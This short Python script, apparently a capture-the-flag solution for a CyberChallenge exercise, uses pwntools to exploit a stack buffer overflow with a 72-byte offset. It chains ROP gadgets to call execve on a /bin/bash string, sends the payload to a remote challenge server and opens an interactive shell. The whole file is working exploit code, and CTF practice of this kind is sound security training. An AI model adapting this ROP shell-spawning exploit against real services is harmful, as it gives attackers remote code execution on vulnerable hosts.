# mov rax, 59
# mov rdi, 0x400000+0x0002004
# mov rsi, 0
# mov rdx, 0
# syscall

from pwn import *

pop_rax = 0x000000000040119c
pop_rdi = 0x0000000000401196
pop_rdx = 0x000000000040119a
pop_rsi = 0x0000000000401198
syscall = 0x000000000040119e
bin_bash = 0x400000+0x0002004

offset = 72

payload = b"A"*offset
payload += p64(pop_rax) + p64(59) + p64(pop_rdi) + p64(bin_bash) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(syscall)

p = remote("cyberchallenge.disi.unitn.it", 9102)
p.sendline(payload)
p.interactive()

